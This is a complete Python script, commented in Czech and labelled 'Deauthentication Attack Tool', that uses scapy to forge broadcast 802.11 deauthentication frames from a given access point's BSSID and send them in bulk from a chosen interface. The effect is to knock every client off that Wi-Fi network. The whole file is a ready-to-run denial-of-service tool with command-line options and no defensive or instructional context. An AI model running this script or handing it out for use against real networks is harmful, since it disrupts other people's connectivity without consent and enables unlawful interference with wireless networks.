import argparse
from scapy.all import *

# Funkce pro odeslání Deauthentication paketů
def send_deauth(bssid, iface, count=100):
    """
    Odešle Deauthentication pakety na dané BSSID (broadcastem na všechny klienty).
    :param bssid: MAC adresa přístupového bodu (BSSID)
    :param iface: Rozhraní pro odeslání paketů
    :param count: Počet Deauth paketů k odeslání
    """
    # Deauth paket adresovaný všem klientům (broadcast)
    deauth_pkt = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)

    print(f"Odesílání {count} Deauthentication paketů na BSSID {bssid}...")

    # Odesílání paketů
    sendp(deauth_pkt, iface=iface, count=count, inter=0.1, verbose=True)

    print("Deauthentication pakety byly úspěšně odeslány.")

if __name__ == "__main__":
    # Argumenty z příkazové řádky
    parser = argparse.ArgumentParser(description="Deauthentication Attack Tool")
    parser.add_argument("-a", "--ap", required=True, help="MAC adresa AP (BSSID)")
    parser.add_argument("-i", "--iface", required=True, help="Wi-Fi rozhraní pro útok")
    parser.add_argument("-c", "--count", type=int, default=100, help="Počet Deauthentication paketů (default: 100)")

    args = parser.parse_args()

    # Provést Deauthentication Attack
    send_deauth(args.ap, args.iface, args.count)
